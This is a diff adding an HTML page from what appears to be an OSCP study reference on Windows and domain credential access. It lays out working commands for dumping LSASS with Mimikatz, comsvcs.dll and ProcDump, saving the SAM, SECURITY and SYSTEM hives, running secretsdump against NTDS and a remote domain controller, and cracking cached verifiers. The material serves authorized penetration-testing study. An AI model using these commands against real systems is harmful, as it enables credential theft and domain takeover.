@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Windows and Domain Credential Access — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/reference/06-ad-lateral-movement/02-credential-access/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#1-select-the-source-before-the-tool">1. Select the source before the tool</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#2-establish-privilege-and-protection-state">2. Establish privilege and protection state</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#3-inspect-tickets-before-invasive-collection">3. Inspect tickets before invasive collection</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#4-lsass-live-logon-session-material">4. LSASS: live logon-session material</a><ul><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#direct-mimikatz-access">Direct Mimikatz access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#dump-first-parse-offline">Dump first, parse offline</a></li></ul></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#5-sam-and-system-local-identities">5. SAM and SYSTEM: local identities</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#6-security-and-system-lsa-secrets-and-cached-domain-verifiers">6. SECURITY and SYSTEM: LSA secrets and cached domain verifiers</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#7-credential-manager-and-dpapi">7. Credential Manager and DPAPI</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#8-ntds-and-replication-paths">8. NTDS and replication paths</a><ul><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#offline-ntds-from-an-already-controlled-dc">Offline NTDS from an already controlled DC</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#remote-collection">Remote collection</a></li></ul></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#credential-routing">Credential routing</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#9-classify-before-choosing-the-transition">9. Classify before choosing the transition</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#10-failure-router">10. Failure router</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#tooling-for-this-section">Tooling for this section</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#donpapi--remote-dpapiapplication-secret-collection-with-host-rights">DonPAPI — remote DPAPI/application-secret collection with host rights</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/#sources">Sources</a></li></ul></details><ul><li><details open><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details open><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/" aria-current="page">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/payload-execution/">Payload Execution Obstacles Cheatsheet</a></li><li><a href="/oscp/cheatsheets/pivoting/">Pivoting and Tunneling Cheatsheet</a></li><li><a href="/oscp/cheatsheets/public-exploits/">Public Exploit Adaptation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/service-opportunities/">Service Opportunity Cheatsheet</a></li><li><a href="/oscp/cheatsheets/shells-payloads/">Shells and Payloads Cheatsheet</a></li><li><a href="/oscp/cheatsheets/tool-command-reference/">Tool Command Reference</a></li><li><a href="/oscp/cheatsheets/tool-selection/">Tool Selection Matrix</a></li><li><a href="/oscp/cheatsheets/tools-and-scripts/">Tools and scripts by task</a></li><li><a href="/oscp/cheatsheets/web-exploitation/">Web Exploitation Cheatsheet</a></li><li><a href="/oscp/cheatsheets/web-mapping/">Web Mapping Cheatsheet</a></li><li><a href="/oscp/cheatsheets/windows-privesc/">Windows Privilege Escalation Cheatsheet</a></li></ul></details></li><li><details><summary>Study notes</summary><ul><li><a href="/oscp/notes/Attack_Strategy_Map/">Attack Strategy Map</a></li><li><a href="/oscp/notes/GetSH_Coverage/">getSH Source Coverage</a></li><li><a href="/oscp/notes/Master_Notes/">Master Notes</a></li><li><a href="/oscp/notes/Recognition_Practice/">Recognition practice</a></li><li><a href="/oscp/notes/Speedrun_Breakdown/">Attack-first OSCP speedrun breakdown</a></li><li><details><summary><a href="/oscp/notes/ad-investigation/">AD Notes — focused checks</a></summary><ul><li><a href="/oscp/notes/ad-investigation/acl/">An ACL shows a powerful right — can I actually use it?</a></li><li><a href="/oscp/notes/ad-investigation/asrep/">Can this account produce AS-REP roasting material?</a></li><li><a href="/oscp/notes/ad-investigation/bloodhound/">How do I turn a BloodHound graph into a verified path?</a></li><li><a href="/oscp/notes/ad-investigation/conditional/">When should I investigate AD CS, delegation or GPOs?</a></li><li><a href="/oscp/notes/ad-investigation/context/">What identity and domain am I actually using?</a></li><li><a href="/oscp/notes/ad-investigation/credential-sources/">On a controlled host, where could useful credentials exist?</a></li><li><a href="/oscp/notes/ad-investigation/failure/">A command failed or returned nothing — what can I conclude?</a></li><li><a href="/oscp/notes/ad-investigation/files/">I found a script or configuration file — what matters?</a></li><li><a href="/oscp/notes/ad-investigation/hosts/">Which computers can this identity access?</a></li><li><a href="/oscp/notes/ad-investigation/kerberoast/">I found a service account — is Kerberoasting useful?</a></li><li><a href="/oscp/notes/ad-investigation/managed/">Can I read a LAPS or gMSA secret?</a></li><li><a href="/oscp/notes/ad-investigation/material/">I found a secret — what kind is it and where can I use it?</a></li><li><a href="/oscp/notes/ad-investigation/movement/">I have credentials — which remote-access method fits?</a></li><li><a href="/oscp/notes/ad-investigation/object-change/">Which identity change follows from a validated object right?</a></li><li><a href="/oscp/notes/ad-investigation/policy/">How do I interpret password policy before testing credentials?</a></li><li><a href="/oscp/notes/ad-investigation/quick-reference/">AD — Quick Reference</a></li><li><a href="/oscp/notes/ad-investigation/read-output/">How to read command output</a></li><li><a href="/oscp/notes/ad-investigation/reenumerate/">I gained a new account or host — what do I check again?</a></li><li><a href="/oscp/notes/ad-investigation/replication/">Does this identity really have DCSync rights?</a></li><li><a href="/oscp/notes/ad-investigation/routes/">Is this an access failure or a missing route?</a></li><li><a href="/oscp/notes/ad-investigation/secure-baseline/">Expected behavior or useful weakness?</a></li><li><a href="/oscp/notes/ad-investigation/sessions/">A privileged user has a session — what does that mean?</a></li><li><a href="/oscp/notes/ad-investigation/shares/">Which shares and files should I inspect first?</a></li><li><a href="/oscp/notes/ad-investigation/smb-wmi/">SMB or WMI execution — what must be true first?</a></li><li><a href="/oscp/notes/ad-investigation/spns/">What does an SPN tell me to investigate?</a></li><li><a href="/oscp/notes/ad-investigation/tickets/">What does this Kerberos ticket actually allow?</a></li><li><a href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="windows-and-domain-credential-access">Windows and Domain Credential Access</h1>
+<p><a href="/oscp/reference/06-ad-lateral-movement/">← Stage index</a> | <a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Domain mapping</a> | <a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential handling</a> | <a href="/oscp/cheatsheets/active-directory/">AD cheatsheet</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a>; <a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Prerequisite:</strong> an already authorized host/session and the exact privilege required by the selected source. Do not collect everything by default.</p>
+<p><strong>Decision:</strong> <code>CURRENT IDENTITY → SOURCE → REQUIRED PRIVILEGE/PROTECTION → ARTIFACT TYPE → COMPATIBLE NEXT USE</code>.</p>
+<p><strong>Exit:</strong> classify each result as password, NT hash, AES key, ticket, DPAPI material, cached verifier or local/domain secret; protect it in private records and re-enumerate only through compatible authentication.</p>
+</blockquote>
+<h2 id="1-select-the-source-before-the-tool">1. Select the source before the tool</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Source</th><th>What it can contain</th><th>Typical prerequisite</th><th>Result is not automatically</th></tr></thead><tbody><tr><td>Current ticket cache</td><td>TGTs and service tickets for the current logon session</td><td>Current user; other LUIDs normally require elevation</td><td>A password, NT hash or authorization to every service</td></tr><tr><td>LSASS memory/dump</td><td>Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type</td><td>Administrator/SYSTEM, suitable debug/dump access, compatible architecture</td><td>Guaranteed cleartext or every user's reusable secret</td></tr><tr><td>SAM + SYSTEM</td><td>Local account password hashes</td><td>Administrator/SYSTEM/backup-capable access to matched hives</td><td>Domain-account material</td></tr><tr><td>SECURITY + SYSTEM</td><td>LSA secrets, service/machine secrets, cached domain verifiers</td><td>Administrator/SYSTEM/backup-capable access to matched hives</td><td>Directly passable cached-domain hashes</td></tr><tr><td>Credential Manager/DPAPI</td><td>Targeted saved credentials and protected application data</td><td>Suitable user/machine context plus master-key material</td><td>Plaintext merely because a blob/file is readable</td></tr><tr><td>NTDS + SYSTEM</td><td>Domain account hashes/keys from a DC database</td><td>DC-level file access and matched boot-key material</td><td>Ordinary member-server admin access</td></tr><tr><td>DRS replication</td><td>Selected domain-account secrets</td><td>Effective replication rights at the domain root</td><td>Local admin, DC service access or Domain Users membership</td></tr></tbody></table>
+<h2 id="2-establish-privilege-and-protection-state">2. Establish privilege and protection state</h2>
+<pre><code class="language-cmd">whoami /all
+tasklist /fi "imagename eq lsass.exe"
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
+</code></pre>
+<pre><code class="language-powershell">Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
+  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
+</code></pre>
+<p>Interpretation:</p>
+<ul>
+<li>membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;</li>
+<li><code>SeDebugPrivilege</code> must be present and usable for common live-process access;</li>
+<li>a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;</li>
+<li>LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;</li>
+<li>EDR/AV can block a tool or dump path without proving the underlying credential source is empty.</li>
+</ul>
+<p>An access-denied or empty result disproves only that method in the current context.</p>
+<h2 id="3-inspect-tickets-before-invasive-collection">3. Inspect tickets before invasive collection</h2>
+<pre><code class="language-cmd">klist
+klist tgt
+klist sessions
+</code></pre>
+<p>When privileges permit inspecting another logon session:</p>
+<pre><code class="language-cmd">klist -li 0xLUID tickets
+klist -li 0xLUID tgt
+</code></pre>
+<pre><code class="language-cmd">Rubeus.exe triage
+Rubeus.exe dump /luid:0xLUID /nowrap
+</code></pre>
+<blockquote>
+<p>Do not use <code>klist purge</code> during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using <a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/#6-ticket-inventory-classification-and-conversion">Kerberos and identity transitions</a>.</p>
+</blockquote>
+<h2 id="4-lsass-live-logon-session-material">4. LSASS: live logon-session material</h2>
+<h3 id="direct-mimikatz-access">Direct Mimikatz access</h3>
+<pre><code class="language-text">mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+</code></pre>
+<p>Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with <code>Password : (null)</code> is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.</p>
+<h3 id="dump-first-parse-offline">Dump first, parse offline</h3>
+<p>Built-in <code>comsvcs.dll</code> method from an elevated command prompt:</p>
+<pre><code class="language-cmd">for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
+</code></pre>
+<p>Sysinternals ProcDump alternative:</p>
+<pre><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+</code></pre>
+<p>Parse with a compatible Mimikatz build:</p>
+<pre><code class="language-text">mimikatz.exe
+sekurlsa::minidump C:\Path\To\lsass.dmp
+sekurlsa::logonpasswords
+sekurlsa::tickets
+</code></pre>
+<p>Common failures:</p>
+<ul>
+<li>dump creation denied: token/protection/EDR or process-access prerequisite failed;</li>
+<li><code>ProcessorArchitecture</code> mismatch: use compatible x64/x86 tooling;</li>
+<li>OS major-version mismatch: parse with a compatible build/environment;</li>
+<li>dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.</li>
+</ul>
+<p>LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.</p>
+<h2 id="5-sam-and-system-local-identities">5. SAM and SYSTEM: local identities</h2>
+<pre><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Mimikatz alternative from a suitable elevated context:</p>
+<pre><code class="language-text">privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<p>Interpret a typical account row as:</p>
+<pre><code class="language-text">LOCAL_USER:RID:LM_HASH:NT_HASH:::
+</code></pre>
+<p>The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.</p>
+<h2 id="6-security-and-system-lsa-secrets-and-cached-domain-verifiers">6. SECURITY and SYSTEM: LSA secrets and cached domain verifiers</h2>
+<pre><code class="language-cmd">reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Mimikatz alternative:</p>
+<pre><code class="language-text">privilege::debug
+token::elevate
+lsadump::secrets
+lsadump::cache
+</code></pre>
+<p>Potential categories:</p>
+<ul>
+<li><code>$MACHINE.ACC</code>: member computer's domain-account secret/key material;</li>
+<li>service/autologon secrets: usefulness depends on whether the service/account remains active;</li>
+<li><code>NL$1</code>-style cached logon data: DCC2/MSCache v2 verifier material.</li>
+</ul>
+<p>DCC2 is for offline guessing, not Pass-the-Hash:</p>
+<pre><code class="language-bash">hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+</code></pre>
+<p>Verify the exact format with the installed Hashcat examples before cracking.</p>
+<h2 id="7-credential-manager-and-dpapi">7. Credential Manager and DPAPI</h2>
+<pre><code class="language-cmd">cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+</code></pre>
+<pre><code class="language-powershell">Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
+Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
+Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext.</p>
+<p>DPAPI reasoning:</p>
+<pre><code class="language-text">PROTECTED BLOB
+-> MASTER-KEY GUID
+-> USER OR MACHINE PROTECT SCOPE
+-> MASTER-KEY DECRYPTION MATERIAL
+-> APPLICATION-SPECIFIC DECODING
+</code></pre>
+<p>Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.</p>
+<h2 id="8-ntds-and-replication-paths">8. NTDS and replication paths</h2>
+<h3 id="offline-ntds-from-an-already-controlled-dc">Offline NTDS from an already controlled DC</h3>
+<p>An offline parse needs a matched <code>NTDS.dit</code> and SYSTEM hive:</p>
+<pre><code class="language-bash">impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.</p>
+<h3 id="remote-collection">Remote collection</h3>
+<pre><code class="language-bash">impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'
+</code></pre>
+<pre><code class="language-bash">impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'
+</code></pre>
+<p>This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use <a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#dcsync-replication-rights">DCSync</a>.</p>
+<h2 id="credential-routing">Credential routing</h2>
+<p><img src="/oscp/diagrams/ad-credential-routing.png" alt="Match recovered material to a compatible authentication method"></p>
+<p><a href="/oscp/diagrams/ad-credential-routing.svg">Open scalable SVG</a> | <a href="/oscp/diagrams/ad-credential-routing.png">Open PNG</a></p>
+<h2 id="9-classify-before-choosing-the-transition">9. Classify before choosing the transition</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Output</th><th>Type</th><th>Immediate compatible possibilities</th><th>Not valid as</th></tr></thead><tbody><tr><td>Cleartext password</td><td>Reusable secret</td><td>Password authentication, key derivation, DPAPI where applicable</td><td>Proof of authorization</td></tr><tr><td>NT hash</td><td>NTLM key</td><td>Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported</td><td>Net-NTLM response or DCC2</td></tr><tr><td>AES128/AES256 key</td><td>Kerberos long-term key</td><td>Request Kerberos material using compatible tooling</td><td>Direct NTLM authentication</td></tr><tr><td><code>.kirbi</code> / ccache</td><td>Kerberos ticket container</td><td>Use while valid for its client/realm/SPN scope</td><td>Password/hash</td></tr><tr><td>DCC2/MSCache v2</td><td>Offline verifier</td><td>Offline cracking</td><td>PTH</td></tr><tr><td>DPAPI key/blob</td><td>Protected-data material</td><td>Decrypt only with matching context/keys</td><td>General logon credential</td></tr><tr><td>Machine-account key</td><td>Computer identity</td><td>Map the computer account's rights and Kerberos/NTLM paths</td><td>Human/domain-admin identity</td></tr></tbody></table>
+<p>Every newly usable identity returns to Block 10 before movement:</p>
+<pre><code class="language-text">VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
+                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES
+</code></pre>
+<h2 id="10-failure-router">10. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Interpretation</th><th>Next action</th></tr></thead><tbody><tr><td><code>privilege::debug</code> fails</td><td>Token is not elevated or privilege is unavailable</td><td>Verify integrity/privileges; use another authorized source</td></tr><tr><td>LSASS open/dump denied</td><td>PPL/Credential Guard/EDR/token limitation</td><td>Confirm protection state; do not infer no credentials</td></tr><tr><td>Dump parser architecture/version error</td><td>Tool/dump incompatibility</td><td>Match architecture and compatible OS/tool build</td></tr><tr><td><code>Password : (null)</code></td><td>Provider did not retain cleartext</td><td>Inspect typed hashes/keys/tickets; do not force a cleartext assumption</td></tr><tr><td>SAM parse boot-key error</td><td>SYSTEM/SAM mismatch or damaged export</td><td>Reacquire matched hives from the same state</td></tr><tr><td>SECURITY output shows cached domain values only</td><td>Offline verifiers, not reusable NT hashes</td><td>Use the correct offline format</td></tr><tr><td>Credential Manager lists target but no secret</td><td>Reference is context/application-bound</td><td>Test through the owning 